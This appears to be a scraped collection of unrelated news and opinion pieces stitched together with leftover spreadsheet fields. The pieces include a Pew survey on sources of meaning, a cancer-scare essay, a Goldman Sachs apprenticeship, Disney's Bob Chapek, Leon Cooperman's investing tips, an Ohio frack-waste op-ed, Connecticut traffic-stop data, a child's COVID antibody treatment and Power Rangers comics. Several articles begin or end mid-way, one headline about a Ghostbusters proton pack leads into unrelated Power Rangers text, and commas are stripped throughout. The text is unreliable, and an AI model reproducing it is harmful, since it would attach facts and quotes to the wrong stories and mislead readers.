Pew asked individuals in seventeen advanced economies around the globe “What aspects of your life do you find meaningful fulfilling or satisfying?” They found both some common themes and some significant diversity. Fourteen of the countries had the same top answer: family. Most countries had either “occupation and career” or “material well-being” in the number-two spot but not the U.S. where “friends” jumped ahead. But after that things diverge dramatically.

Table from Pew Research Center showing “ranked choice among 17 topics coded as part of what gives people meaning in life.” (Image via Pew Research Center.)

Some of the more surprising findings:

“Romantic partner” ranked low across all seventeen countries though the U.S. ranked it highest out of all of them.

“Pets” also ranked low; clearly Seattle dog-owners were under-sampled in the survey.

“Occupation and career” was low in the United States — the fourth-lowest among the countries surveyed. That’s a fairly significant departure from how our culture is portrayed in popular media and in contrast with the high number of working-hours for most Americans.

A graph showing the percentage of respondents in each surveyed country “who mention their occupation and career when describing what gives them meaning in life.” (Image via Pew Research Center.)

“Service and civic engagement ” is low everywhere but again highest in the U.S. among the countries surveyed.

Less surprising is that “Faith” ranked #5 in the United States the only country where it was in the top-five sources of meaning in people’s lives. Perhaps also not surprising was that “material well-being” was in the top five for all but two “advanced economy” countries: Greece and the U.K.

Graph showing percentage of survey respondents “who mention spirituality faith and religion when describing what gives them meaning in life.” (Image via Pew Research Center.)

The survey called out some (also not terribly surprising) ideological differences within the United States: Republicans were twice as likely as Democrats to cite “freedom” while left-leaning individuals were more likely to cite “nature.”

The report includes a discussion of the challenges and obstacles that people cite in their personal journey toward finding meaning in life. It brings back to the surface what is perhaps an unanswerable question: Do we find meaning and fulfillment in life despite the challenges we face — or because of them? It’s a particularly relevant question to ask now given the COVID global pandemic the economic upheaval it has caused in addition to the loss of family members and friends and the long path to recovery. It is interesting to note though that Pew found those who list family and friends as sources of meaning in their lives were less likely to mention challenges and adversity.

There is plenty more in the report that you will enjoy perusing including differences between younger and older individuals which people find general satisfaction in life rather than deriving it from specific things and differences in answers depending on income level or educational attainment.

While never saying it explicitly this survey — and the global diversity of answers that it highlights — suggests a “crowd-sourced” answer to the ultimate question: perhaps the meaning of life is how we as individual human beings choose those things that we personally find meaningful.

I thought it was just another deer fly bite collateral damage from a mid-June afternoon spent tending the cottage garden. Like the two or three on my arm this one below my left ear swelled and turned mildly painful. Unlike them it didn’t go away in a day or two. It got bigger harder and more painful. So much so that I drove back to the city to see my GP who booked an ultrasound which a few days later indicated a cyst had taken root under my salivary gland. Likely nothing too serious my doctor said referring me to an ear nose and throat specialist with the proviso that it could take weeks to be seen. And that if it got worse I should head to the ER.

It did. Chewing food became agony. After a sleepless night – just putting my head on the pillow turned into torture – I was in the ER. Eight hours and one CT-scan later the attending physician said I likely had parotitis – a condition akin to mumps – and prescribed antibiotics. One thing worried him though: My left eyelid was flickering not closing as it should.

A week later in even worse pain and with the left eye refusing to shut I was back at the ER. It was just as crowded but no waiting this time: I was tended to almost immediately by two doctors CT-scanned again and had my eyelid taped shut. People were exceedingly kind which should have twigged me that something was seriously wrong. I left with a referral to the hospital’s senior ENT specialist. That was on a Saturday night. His office called Monday morning – apparently there was some urgency – and shortly after I was in his clinic where having reviewed my test results and examined my misshapen jaw he made his call: Cancer. He was 90 per cent sure though he said he’d be delighted to be proven wrong. The left eyelid’s refusal to shut indicated the tumour – the first time that dreaded word had been used – was spreading and seizing the optic nerve.

I wish I could tell you I was stoic and took this in stride but that would be a lie. I cried which is rather unbecoming in a six-foot-four 200-pound man. I was not prepared to hear the word cancer which immediately shifted my life soundtrack from major to minor key.

On some level I was offended. I’m a former marathon runner damn it. I don’t smoke. Drink moderately. Use sunscreen. We eat a Mediterranean diet and exercise regularly. I do hours of gardening at a time. I was a fool. All that is irrelevant. Cancer doesn’t care. It is an equal opportunity destroyer.

I went home; told my wife. Cried a bit more. Told a few family members and close friends. (Why not? The unblinking eyeball was a giveaway.) Cried a bit more. I reached out to a dear friend a couple of provinces away who had survived non-Hodgkin lymphoma who advised me not to be afraid to ask for help. I didn’t need to: Neighbours family and friends stepped up providing rides to and from medical appointments dinners books offers to dog-sit.

My mood would swing from highly intense (every conversation seemed important every book filled with life-or-death messages) to existential apathy. Why plant more perennials if I might not be able to see them bloom next year? Why search for order in a chaotic world? To escape I would listen to head-banger rock played loudly on headphones blocking out any possibility of pondering life’s mysteries while I suckered the tomato plants.

I also developed a deep desire to travel back in time. I dearly wanted to go back and ask for forgiveness from people I’d treated badly. Withdraw ultimatums issued in arrogance. Stifle some of the absolutely stupid things I’ve said. Erase rudeness; insert kindness. When you get a “90 per cent chance it’s cancer” diagnosis you can resolve to be a better person but you can’t go back and fix the damage you’ve already done. You can apologize but that won’t necessarily make it right.

The operation went well. The surgeon removed a mandarin-orange-sized growth from my jaw and untangled its tentacles without having to sever the optic nerve. The post-surgery period into mid-September meant stepping into life’s waiting room: No committing to anything no making plans. My wife and I were mentally preparing for the round of radiation likely to follow. Possibly chemo.

As it turned out my doctor was proven wrong. I was in the fortunate 10 per cent. The growth he removed was not cancerous. What was a tumour returned to being a cyst. No need for radiation chemo or for that matter any further treatment.

Not all is perfect of course. The carefully preserved optic nerve refuses to re-engage leaving my left eyelid permanently up. I tear up frequently crying when I laugh or when I step out into cold air. The eye has to be taped shut every night and is susceptible to being scratched. The left side of my jaw is permanently frozen as though it’s been shot through with Novocain. I have a ropey scar running around the back of my ear and along my jaw but my beard covers it. I need a procedure to drop the eyelid down a bit for some protection. Nietzsche is wrong: That which doesn’t kill you doesn’t make you stronger. At least not physically. But these are minor things to be incorporated into my new normal. My heart goes out to people who really do have cancer who have to go through grueling treatments in hopes of defeating this despicable disease and getting their life back.

What I won’t forget though from this dodging of the cancer bullet is that while life is short you need to find time to be kind. Kind to people who are kind to you. Kind to those who aren’t. To think twice (or thrice) before saying rude stupid arrogant things you will later thrash around in bed at 3 a.m. because you can’t go back in time to make them right.

The programme which is part of an apprenticeship scheme launched in partnership with Queen Mary University of London will combine paid on-the-job training with study over four years offering students a chance to gain hands-on experience in a sector still struggling to attract candidates from less-affluent backgrounds.

The programme which opens for recruitment on Monday comes nearly a year after the Treasury and the Department for Business Energy and Industrial Strategy launched an independent taskforce to address a lack of socioeconomic diversity across financial and professional services after research found that just under half of senior City roles were held by white men who attended an independent or selective state school.

A 2019 study by KPMG also found that 41% of people working in finance across the UK had parents in the same sector far higher than the national average of 12% raising concerns about a lack of access to City roles for less-privileged students.

“As an industry we are still not doing a good enough job at appealing to students from a more diverse socioeconomic background” Daniel Freckleton a managing director in global markets at Goldman Sachs said.

“There is of course an interplay between socio-economic background and ethnic minorities so working to improve social mobility in our recruitment process is likely to have knock-on benefits to our racial diversity too” he added. Freckleton is one of the few black managing directors on the the bank’s London trading floor. He is the main sponsor of the apprenticeship scheme.

While some banks have launched apprenticeship schemes in the UK most have been focused on back-office roles. Goldman’s programme is believed to be one of the first schemes aimed at bringing trainees directly on to the trading floor of an investment bank.

The Goldman scheme will start by selecting 10 candidates to start the scheme in September 2022 with an opportunity to increase its cohort in following years. Students will earn a “competitive” annual salary alongside their studies and will be eligible for a bonus helping avoid student debt by working five days a week on the trading floor.

They will also study at Queen Mary’s school of economics and finance for two one-week “teaching sprints” per semester. The academic programme will consist of lectures and assessments covering topics ranging from asset pricing to machine learning.

Goldman will pay for relocation and equipment such as books and laptops as needed to help students who might otherwise struggle to cover the costs of formal training. Candidates will also be eligible for a full-time role at Goldman at the end of their course.

Recruitment is open to students from all educational backgrounds but will be broadly aimed at people coming from state education.

“We want to attract the brightest and best students from as diverse a talent pool as possible – that’s diversity of socio-economic background as much as anything else” Freckleton said.

“Unfortunately we’re currently missing out on a lot of this talent either because students are put off by the traditional recruitment process the financial barriers of university study or simply because they are not aware of the kinds of jobs that Goldman has to offer them.”",https://news.google.com/articles/CBMiPmh0dHBzOi8vaW5zaWRldGhlbWFnaWMubmV0LzIwMjEvMTIvYm9iLWNoYXBlay1jb3N0LWN1dHRlci1tYzEv0gEA?hl=en-US&gl=US&ceid=US%3Aen,"Disney CEO Bob Chapek Hates Being Seen As ""Cost-Cutter"" - Inside the Magic","Bob Chapek has become quite the divisive CEO at The Walt Disney Company.

With a petition going viral recently trying to persuade the Walt Disney Company to fire Chapek the Disney head has become quite a continued topic of discussion among Disney Guests.

With Disney fans discussing Chapek’s focus on budget cuts and layoffs as well as moving attention to Disney+ and away from the quality of the Disney Parks Chapek has now revealed he dislikes this “bean-cutter” reputation he has gained as Disney CEO.

Chapek did not have it easy to begin with as CEO starting just before the COVID-19 pandemic and making difficult decisions throughout including budget cuts and laying off 28000 Cast Members a focus on Disney+ the closures of Walt Disney World Disneyland Resort Disney Cruise Line and Disney Parks across the globe as well as a high-profile lawsuit.

In late July Black Widow star Scarlett Johansson sued The Walt Disney Company claiming that the studio giant had breached its contract with her when it released Marvel’s Black Widow in theaters and on Disney+ at the same time. Disney fought back and called the lawsuit “callous”.

According to Johansson and Disney the sides have amicably settled their lawsuit and will continue working together on future projects including Johansson’s highly-anticipated Tower of Terror movie.

Bob Chapek’s role as CEO of the beloved Walt Disney Company follows a 15-year tenure from Bob Iger who is currently acting as chairman to help guide Chapek through the transitional period. Iger will be ending his Disney employment at the end of this month and Chapek will be on his own.

During a recent annual retreat for the company’s upper management at Disney’s Aulani Resort in Hawaii Iger seemed to hint at the data-driven nature of Chapek. Iger spoke about his advice on successfully being the CEO of The Walt Disney Company and not to let data control their decision but rather creativity.

This reputation as being data-driven is resented by Chapek who revealed in a piece by the Financial Times that the notion of him as “an outsider a number-cruncher a cost-cutter” in comparison with his predecessors Bob Iger and Michael Eisner – who were viewed as “creative people at heart.” – “irks” the new CEO.

The interview with the Financial Times covers Chapek’s time as CEO of the Walt Disney Company detailing his career and journey to the top.

According to the interview Chapek’s rise to CEO as an “unknown” in the industry” “worries some actors directors and agents in Hollywood.” especially with his drive to focus on Disney+ Disney’s streaming service.

The Financial Times comments on Chapek’s resentment of those who think he is not creative:

The notion that he is merely a bean-counter irks Chapek. “I’ve seen creativity in this company through every lens possible” he says in an exclusive interview. He compares running the theme parks with observing “a focus group every day” that gave him a unique perspective on “what makes the Walt Disney Company so different from any other media company”. He adds “It ties us to our ultimate constituent which is the consumer.”

Further comments by executives at Disney reveal his reputation within the company itself. A former entertainment executive at Disney said that Chapek is seen as “very operational” in the company while Rich Greenfield an analyst at LightShed Partners said that the Disney CEO “is not a visible person.”

One former executive claims that since Chapek became CEO Disney has “became a club where the old members reasserted themselves. The only qualification they had was they had to have been around for 30 years at Disney and nowhere else.”

Of course we recently reported how Chapek has been restructuring the company hiring former BP executive Geoff Morrell as Chief Communications Officer while former Procter & Gamble executive Susan Arnold will replace Iger as Chairman of the Board.

And adding to the reports from the annual treat at Disney’s Aulani Resort the piece by Financial Times revealed that Bob Iger apparently expressed worry that “the company was changing and he was concerned by the lack of innovation the lack of strategy.”

Chapek’s focus on the consumer has also reportedly caused a rift between the magic and revenue of Disney movies the Financial Times writes:

This tension has boiled over into a conflict over the two things people in Hollywood care about most: the magic of movies and the colour of money.

The article from The Financial Times does however highlight Bob Chapek’s enjoyment of the Disney Parks with Chapek enjoying a day at Disneyland:

He knows this place intimately and despite years of dealing with the crises and headaches that come with running some of the most scrutinised attractions on earth it is clear Chapek still feels the Disney magic. He lets out whoop-whoops on a Cars Land ride devours an enormous corn dog on a stick and recites the safety instructions for Soarin’ a multisensory ride that is among his favourites along with the narrator. “I must have seen this 60 times” Chapek says of the tongue-in-cheek video “but it still gets me every time.”

It’s interesting to see the Chapek is just like us and can recite Patrick Warburton’s introduction video on Soarin’ the popular attraction found at EPCOT and Disney’s California Adventure theme park.

Iger is currently acting as chairman to help guide Chapek through the transitional period. Iger will be ending his Disney employment at the end of 2021 and Chapek will be on his own.

Bob Iger was a beloved and successful CEO at the Walt Disney Company steering Disney through acquisitions of Lucasfilm Pixar Marvel Studios and 21st Century Fox to become the giant entertainment company it is today.

Iger led Walt Disney World and Disneyland Resort through the additions of Pandora – The World of Avatar Toy Story Land Cars Land and of course Star Wars: Galaxy’s Edge. He also opened Shanghai Disneyland in 2016.

Iger will be replaced as chairman of the board by longtime board member Susan Arnold and he recently took to presenting the weather on ABC in a fun interview.

Before he was CEO Bob Chapek was Chairman of Disney Parks Experiences and Products leading Disney’s travel and leisure businesses such as Disney Cruise Line Adventures by Disney and Disney Vacation Club as well as Disney’s Global Consumer Products Operations.

While Chairman of Disney Parks and Resorts Chapek oversaw a massive expansion for Disney Parks worldwide including the opening of Shanghai Disney Resort the expansion projects of Disneyland Paris and Disneyland Hong Kong and the announcement of Star Wars Galaxy’s Edge at Walt Disney World and the Disneyland Resort. Chapek is also credited as the reason more Disney IPs are being incorporated into the Parks.

We’ll have to wait and see what Chapek brings to the Walt Disney Company now that the Parks are reopening Disney+ has the MCU’s Hawkeye launching every Wednesday and Disney Genie+ has launched in both Disneyland and Walt Disney World.

Billionaire investor Leon Cooperman says that investors shouldn't restrict themselves to a particular sector or a stock when making an investment decision and should be willing to buy any stock or bond at the right price. Cooperman has made it known that although there is no secret sauce for investment success it is very critical to look at free cash flow while choosing a company to invest in. “Free cash flow gives companies the luxury to do good things whether it’s pay dividends buy back stock invest in new equipment et cetera. Equally important is management and ownership and how they manage that cash flow"" he once said in an interview to a financial website.A Wall Street legend Cooperman built up Goldman Sachs' asset management division during his long tenure with the investment bank. The son of a plumber in the Bronx he went to public schools Hunter College and then got an MBA from Columbia University. Cooperman founded Omega Advisors in 1991 a hedge fund known for its strong performance. He shut it down at the end of 2018. In 2019-2020 he began shifting more of his assets into his charitable foundation.The finance guru stresses that family is the most important part of life and that those who have achieved financial success have a moral obligation to help others in need. “To be successful in your chosen field of endeavor be ready to give of your mind of your body and of your soul to achieve that success” he says.Cooperman always based his trading on the idea that stocks have a memory. “They know where they came from so I tend to look at either the new low list or things in the middle of their trading range to get involved and I don’t like to buy the new high list” he says.In his 45 years of experience in the financial world Cooperman says hedge fund managers must outperform others and react intelligently to the market. “You’ve always got to be on the balls of your feet — not resting on your laurels.”His view is that it is better to invest in stocks over bonds. When vetting a potential investment it is important to pick companies that generate cash-flow and run by honest and capable management who use incentives to make the company run well. ""Find work you like to do and work with people you admire and respect"" he says.Cooperman is of the view that investors should spend a lot of time to figure out the market. ""Is the market undervalued? Overvalued? Is it going to go up? Is it going to go down? Because that determines how much risk you want to have in your portfolio.""The hedge fund manager says investing comes with a lot of ups and downs. “In this business if you don’t make mistakes you’re either a liar or you don’t take many swings at the ball” he once said.Cooperman has always employed a classic value strategy and performed intensive research to identify undervalued stocks. He has kept an eye at micro company developments and also used macroeconomic analysis to find out how much risk to take and when to dabble in other asset classes such as international stocks bonds currencies commodities and equity indexes.In his interviews Cooperman has revealed some investment tips that can help many young investors achieve superior returns. Let's look at some of these tips.The Wall Street legend says the primary job of any value investor is to find assets that are sufficiently mispriced so that they can be bought at a bargain. The purchase price provides a margin of safety. “We’re looking for things that are mispriced where opportunity for achieving excess returns exists.”It is important to be right while following a contrarian strategy the market veteran cautions investors. They can’t outperform a crowd by following a stock but at the same time always avoiding what is popular is not the right approach. Cooperman is of the view that achieving investment success requires hard work and critical thinking. “With an average IQ a strong work ethic and a heavy dose of good luck you can go very far. The harder I worked the luckier I got. If you don’t want to work and think buy a low-cost index fund"" says the billionaire investor.Patience is a very important virtue and is very critical for a value investor as what price investors pay for an investment is not always what they get at the end Cooperman says. ""When you see an opportunity you must also act quickly and aggressively. Few investors have the temperament to do this since they panic when the crowd is fearful. Inverting your emotions in an opposite direction from the crowd is not an easy thing to do. Almost everyone is better served by sticking to a low-cost diversified portfolio of index funds"" says the founder of Omega Advisors.Investors should always keep a margin of safety while making an investment decision. ""If you buy at a substantial discount to intrinsic or private market value you can make a mistake and still do just fine. And if things work out better than you thought you get an additional bonus"" says the investment guru.Investors should understand all the aspects of the business they are planning to invest in. He says not knowing what investors are doing invites a lot of risk. “We have a very narrow assignment and that’s to know the companies we know better than anyone else and own the right companies.”Cooperman says investing where the competition is dumb misinformed and lazy is an excellent way to boost investment returns. Boring “get rich slow” approaches attract fewer competitors though that is helpful in the competitive world of investing. ""The good news here is that ‘get rich quick type’ people are those who you are competing against. If other investors and traders were not muppets sometimes value investing would not work. Turning their dysfunctional behavior into profit is your opportunity"" he says.The former Goldman Sachs executive says his view is that the key element in the quality of any business is a moat. “A business that has a moat around it where it’s competitively insulated to some large degree.”Cooperman says it is easy to get caught in the movement of a herd and it is easiest of all to follow the herd when it is close to the end of a cycle. “What the wise man does in the beginning the fool does in the end. Even the wisest investors can fall victim to crowd folly. The basic underlying force at work is that people rarely make decisions independently. Fear of missing out (FOMO) and laziness make people follow the lead of other people and that process can snowball. Or not. And it will continue until it doesn’t"" he points out.Investors have to respect the stock market  he adds and if they don’t they’re going to get wiped out.(Disclaimer: This article is based on various interviews given by Leon Cooperman)"

Guest columnist

The Ohio Department of Natural Resources Division of Oil and Gas Resource Management has once again demonstrated its complete fealty to the fracking industry.

It has done so by its continuing failure to propose rules to appropriately protect the environment and public health from the consequences of the irresponsible handling processing and disposal of toxic radioactive frack waste.

More:Ohio study says water safe despite risk of hydraulic fracturing waste contamination

Instead of addressing the serious issues arising from the disastrous federal failure to regulate through the “Halliburton Loophole” thereby falsely classifying frack waste as “non-hazardous” the division fails to address the problems this entails although it has seen enough of the serious issues the lack of regulation has caused.

Even the courts have not demanded the agency do needed rulemaking and our citizen’s case lost on standing only – not on the merits.

We even appealed to the U.S. Environmental Protection Agency to revoke primacy because the agency was not properly protecting citizens from the harms of the lack of regulation.

Without recourse we waited over 8 years for the division to propose rules that would effectively address the mishandling and toxic releases from frack waste processing and disposal.

The agency obviously has no intention to deal with this serious issue as evidenced by its most recent attempt at rulemaking by proffering totally inadequate rules with public review and comment closed in only 30 days ending Nov. 29 just after a holiday.

More:Ohio moves fracking waste facility rules forward 8 years after requested by Ohio lawmakers

The very little time to engage educate and formulate responses to the substantial deficiencies in the proposed rules substantiates our continued experience that the agency does not genuinely want public input to counter its support of the fracking industry by allowing cheap disposal of its massive amounts of toxic waste.

To be most expeditious in the flawed process the division combined the review and commenting process for two totally different waste handling/disposal schemes Class II injection wells and Surface Waste Processing Facilities into one.

More:Still no Ohio rules for bringing sanctions against oil and gas drilling waste

By now the division has enough evidence to realize the serious deficiencies in the proposed regulations that deserve separate scrutiny.

Frack waste facilities are handling millions of tons of frack waste with inadequate traceability of where the resultant concentrations of toxic chemicals and radionuclides go to assure proper disposal and accountability for those generating the waste.

Historically both types of facilities lack adequate monitoring and oversight which will not be addressed in the proposed regulations. This ruse of rulemaking process is just another example of industry capture of the Ohio Department of Natural Resources.

Our elected representatives are letting this happen and Ohio taxpayers will pick up the bill just as we are paying already to remediate leaking frack waste injection wells and cap abandoned wells.

More:Report: Ohio fracking counties saw declines in jobs population and income

In addition to the lack of adequate bonding and severance taxes assessed the fracking industry Ohio is giving the industry another massive subsidy in the completely inadequate rules proposed by the Division of Oil and Gas Resource Management.

Ohioans will pay with their health and tax dollars for the continuing designation of the state as the cheap dumping ground for frack waste generated within the state and imported from other states solving the industry’s biggest problem at our expense.

COVID-19 fears and police morale ...,"New statistics show that traffic enforcement by the Connecticut State Police has dropped by more than half since the start of the COVID-19 pandemic.

Despite vehicles driving faster enforcement is down sharply in several major categories including total stops tickets issued and warnings given to drivers.

Traffic stops by troopers peaked most recently in 2014 with nearly 235000 stops according to statistics from the Institute of Municipal and Regional Policy at UConn in Hartford. That total fell to 157007 in 2019 and then 75988 in 2020 — the year that the ongoing pandemic started. The total dropped further to 59891 for the first 10 months of this year.

Andrew Matthews a retired sergeant who serves as executive director of the state troopers union said the three key reasons for lack of enforcement are a drop in staffing by at least 300 troopers concerns about the COVID-19 virus spreading to troopers and low police morale that was caused by the new police accountability law that many officers opposed.

“Now more than ever there’s an anti-law enforcement movement at the Capitol with the legislators” Matthews said in an interview. “Our troopers saw it with the police accountability bill. When you don’t feel supported you’re not eager to go out and self-initiate motor vehicle stops. When you feel like you’re not going to be supported by the legislature when you feel you’re not supported by the command staff and you’re going to be attacked and have internal affairs complaints and go through all that.”

Annual Statewide Traffic Stops New statistics show that traffic enforcement by the Connecticut State Police has dropped by more than half since the start of the COVID-19 pandemic. Enforcement is down sharply in several major categories including total stops tickets issued and warnings given to drivers. Traffic

Stops 2014 234669 2015 218736 2016 194916 2017 170435 2018 147630 2019 157007 2020 75988 SOURCE: UConn

He added “We have cars that go by our troopers on the highway at 100 miles per hour. … They’re not stopping for us. They could not care less.”

Despite the reasons cited by Matthews Gov. Ned Lamont said Friday that he does not attribute part of the enforcement drop-off to morale problems from the police accountability law.

“I don’t think so” Lamont said. “We’ve got a good flow of folks that want to be state police. I know that. I think all across sectors of our economy people are still having a hard time recruiting.”

Rep. Stephen Stafstrom a Bridgeport Democrat who helped write the accountability law said that short staffing is an issue but dismissed the idea that the police accountability law translates into fewer traffic stops.

“To blame a piece of legislation that clearly does not prohibit anyone from doing a job that they would be assigned to do is pure political sour grapes and nothing more than that” Stafstrom said. “I am not a proponent of pulling over folks for going a few miles over the speed limit. But I think we have all seen a fair amount of reckless driving on our highways that folks should be pulled over for where you’re going 20 or 30 miles per hour over the speed limit weaving in and out of the four lanes of I-95. That’s a different story.”

He added “So what are the troopers doing with their spare time?”

Besides the number of total stops the new statistics show that stops with tickets issued also dropped by more than 50% from 105000 in 2019 to slightly more than 45000 in 2020. Tickets dropped further again to 27596 for the first 10 months of this year. Stops with warnings from troopers fell from 2019 to 2020 but then rebounded in the first 10 months this year at more than 27000 warnings surpassing all of 2020.

For both state and local police the combined number of stops statewide dropped from 512000 in 2019 to about 188000 in 2021.

Democrats who supported the police accountability law and Republicans who opposed it have remained divided over whether the measure will improve policing across the state. At the same time police chiefs and rank-and-file officers say they are concerned the new law will lead to difficulties in recruiting new officers and prompt some older officers to retire at a time of low morale.

The detailed law mandates that all officers must wear body cameras bans the use of chokeholds in most cases and creates a new independent inspector general to investigate deadly use of force by police.

An overriding issue is staffing at the state police. The total of troopers peaked at 1283 under Republican Gov. M. Jodi Rell about 15 years ago and the number has dropped below 900 at times due to retirements. Currently 65 troopers are being trained at the police academy.

“I want to bring our state police force back to where it was 10 years ago” Lamont said when asked by The Courant. “We’ve obviously slipped over the last decade. We’ve added additional classes of state police every year I’ve been here. The number of state police is growing but we also have retirements coming up over the next six months — so I’ve got to watch that very carefully.”

An estimated 276 troopers will be eligible to retire by July 1 2022 — when changes in the cost-of-living adjustments in state pensions could prompt a large number of retirements. Attrition at the younger levels is an issue too. State police made 127 offers last year to candidates leading to 120 starting in the academy officials said. But only 83 graduated because many dropped out due to the rigorous training process.

Regarding the sharp drop in enforcement totals at the start of the pandemic and throughout 2020 Lamont said “There was certainly no formal pullback. Maybe people felt a little more cautious about stopping people during the worst of COVID trying to avoid face-to-face encounters. But I haven’t heard that.”

“I think it’s a well-known fact that after 12 months of quarantine some people are driving like a bat out of hell” Lamont said. “It’s not for lack of enforcement. The police are doing everything they can. I take it they’re going to get even stricter on it because it could be a dangerous situation.”

Brian Foley a top aide to state police commissioner James Rovella said Connecticut is seeing the same trends as those around the country.

“There is an industrywide move across law enforcement to shift on the prioritization of traffic stops especially for your low-level violations” Foley said in an interview. “There is an absolute decline in motor vehicle stops around the country. … I don’t think we’ll ever return to the numbers in traffic enforcement that we saw in 2014.”

Foley said the decline in enforcement is not due to the state’s accountability law.

“Every police department in the country is facing morale issues and that trips down into traffic stops” Foley said. “If you look at all the external pressures on police officers you can understand that.”

While the year-end figures will not be available until next year Foley cited an uptick in enforcement in the four months leading up to Halloween.

“In this moment where we are today it’s a police commander’s greatest challenge on how to motivate his staff or troopers and that goes toward motivating them to get guns off the street preventing stolen cars and motivating them to increase traffic enforcement” Foley said. “That’s the greatest challenge right now with morale issues all across the country.”

Symptoms can include loss of motor control respiratory failure and cognitive impairment.

“Imagine a major city with 1/2 its power plant shut down” is how the Friends of Abby Mac Facebook page describes it. “At best this would cause a major blackout. Now imagine your body working only to one half — the brain is impaired vision is dim you are weak and your muscles are too fatigued to walk or crawl.”

Now imagine the possible impact of the pandemic.

“Since the beginning we've been concerned about Abby coming down with COVID” said her father Greg MacCurtain.

A few weeks ago Abby went on a camping trip.

After returning “some people tested positive” said Heidi MacCurtain her mother. Abby showed no symptoms but a test in early November revealed she had contracted coronavirus disease. With her underlying conditions she was at significant risk of hospitalization or death.

""It was really scary to us because we didn't know how it was going to affect her"" said Abby's father. ""We heard that it impacts your respiratory system. I don't think her body could take that.""

The MacCurtains who live in Plymouth Mass. immediately consulted with Abby’s doctors at Mass. General Hospital in Boston — a team that includes a pulmonologist immunologist and neurologist. The neurologist knew about a study of monoclonal antibody therapy for children led by Dr. Michael Koster and a team at Hasbro Children’s Hospital.

Less than two days after testing positive Abby was at Hasbro Children’s receiving an infusion. She was not admitted only seen as an outpatient.

“The next day she did sleep a lot” her mother said.

That was a Saturday.

By the following Monday Abby who uses a wheelchair felt well enough to resume her studies at South Shore Educational Collaborative in Hingham Massachusetts — virtually at first.

'Safe and effective'

In an interview on Friday Koster discussed monoclonal antibody therapy for children. The study has ended and with emergency use authorization recently granted by the Food and Drug Administration the treatment is now available for children from birth to age 11. According to Koster Hasbro Children’s is one of the few centers in the U.S. currently offering it.

“What we have found is it’s safe and it's effective” Koster said. “Abigail is certainly an example of rapid improvement and staying out of the hospital afterwards.”

Word of what’s available in Rhode Island for at-risk and COVID-sick children anywhere has spread according to Koster.

“We infused two children yesterday four today some from New Hampshire New York Massachusetts” the physician said. “So we're really the only hospital hospital system in the region that's offering monoclonal antibodies for this group … [of] high-risk children.”

Abby’s recovery proceeded swiftly.

“Abby is all clear to return to school tomorrow!!” stated a Nov. 14 Friends of Abby Mac Facebook page post illustrated with the girl giving a thumbs-up. “She is super excited. Check out comments to see Abby dancing along to the feelings song. Thank you for all the prayers and positive thoughts.”

On its web page the National Institute of Neurological Disorders and Stroke a division of the National Institutes of Health describes the prognosis for individuals born with Leigh’s disease. Some die not long after birth.

“Those with partial deficiencies have a better prognosis and may live to be 6 or 7 years of age” the institute declares. “Some have survived to their mid-teenage years.”

'A no-brainer'

Even before her treatment at Hasbro Children’s Abby had beaten the odds.

Her monoclonal therapy made those odds even better.

“It's worth the risk to give yourself hope to get your child anything they can to live their best life” Heidi said. “This was a no-brainer. This is what Abby needed in order to be her healthiest.”",https://news.google.com/articles/CBMicGh0dHBzOi8vZ2hvc3RidXN0ZXJzbmV3cy5jb20vMjAyMS8xMi8xMi9yZW1pbmRlci10b2RheXMtdGhlLWxhc3QtZGF5LXRvLW9yZGVyLWEtaGFzYnJvLWdob3N0YnVzdGVycy1wcm90b24tcGFjay_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Today's the LAST DAY to order a Hasbro Ghostbusters Proton Pack!,"Over the past couple of months we’ve made countless posts about Hasbro Pulse’s HasLab Ghostbusters Plasma Series Spengler’s Proton Pack!

Studios.

A few days ago The Illuminerdi reported that Power Rangers Universe would finally bring the suits from the 17th season of Super Sentai Gosei Sentai Dairanger into the Power Rangers franchise.

Aspects of Dairanger have been used in minor instances throughout the history of the franchise such as the mecha and White Ranger being featured in Season 2. The Dairangers also made minor appearances in the show’s 21st season Super Megaforce. However this will be the first time they will be featured front and center.

We also know that the series will focus on the mysterious backstory of the Phantom Ranger who was featured in Power Rangers Turbo and Power Rangers in Space. The Phantom Ranger will presumably team up with this new team at some point. He is also sporting a never-before-seen White version of his suit.

RELATED: POWER RANGERS TO ADAPT GOSEI SENTAI DAIRANGER FOR NEW COMIC-BOOK SERIES: EXCLUSIVE

We also reported that Power Rangers Universe will feature a Power Rangers-exclusive Black Ranger be added to the team as there was no Black Ranger in Dairanger the source material for the book.

The series is expected to take very little from the story of Dairanger as this new team is the children of the Morphin Masters and the mission is to save a mysterious figure they rescue from the Morphin Grid.

Anaylising The Power Rangers Universe Team

During the Power Rangers Fan First Friday the only name that we got for any of the Rangers was Ori. Series writer Nicole Andelfinger used they/them pronouns when referring to the character so it’s possible that Ori could be the first non-binary character in Power Rangers history which would be a huge step for the franchise.

We also saw that the Red Ranger of the Power Rangers Universe team will be female which diverges from Dairanger in which the Red Ranger was male. This is also a very welcome change as female Red Rangers are few and far between in Power Rangers.

Their outfits are also very reminiscent of their parents the Morphin Masters. It will be interesting to see more information on the Morphin Master characters as after almost 30 years we still know very little about these characters that are hugely important to Power Rangers lore.

It will also be interesting to see if they use any of the already used aspects of Dairangers such as the Zords and the White Ranger. It seems like they are going in a very different direction than Dairanger it would be safe to say that the writers will probably try to avoid the Thunder Zords and the White Ranger. Especially since it seems that the Phantom Ranger will (sort of) be the White Ranger of this team/story.

Power Rangers Universe is expected to release in December 2021 and features Nicole Andelfinger as the writer for the series and Simone Ragazzoni serving as the lead artist. Andelfinger is new to Power Rangers however she is known for her works on comic-book versions of other established franchises such as Jim Henson’s Dark Crystal: Age of Resistance Regular Show Rugrats and Steven Universe.

The 1980s still remains the top decade in terms of cultural creativity. This sometimes manifested itself in bizarre hair styles and questionable fashion choices but it also showed up in pop culture film and TV franchises – particularly cartoons.

Indeed the kids of the 80s were spoiled with some of the most exciting and riveting cartoons ever to hit the television. They also boasted some of the coolest and most memorable theme songs in animated history. There are lots of 80s cartoon songs that stand the test of time but these particular entries were the ones that got knees bopping and heads rocking.

Jayce And The Wheeled Warriors

The premise of Wheeled Warriors felt more like an attempt by creative minds to throw ideas at the wall and hope they stuck which meant it didn’t last very long. However it did have one of the most rocking intro songs of any 80s cartoon.

In essence the song was cut from the same cloth as countless other “you’re a winner” hard rock tracks indicative of the time period inspired by artists like Stan Bush. That didn’t reduce the quality of the song however. It’s also one of the longest intro scenes for an 80s cartoon making this song as close to full length as could be.

The Adventures Of The Galaxy Rangers

This oft-forgotten sci-fi/western mashup has one criminally underrated song attached to it and it deserves more credit. The tune sounds like it came straight out of the Top Gun soundtrack shortlist yet failed to make the cut and that’s a good thing.

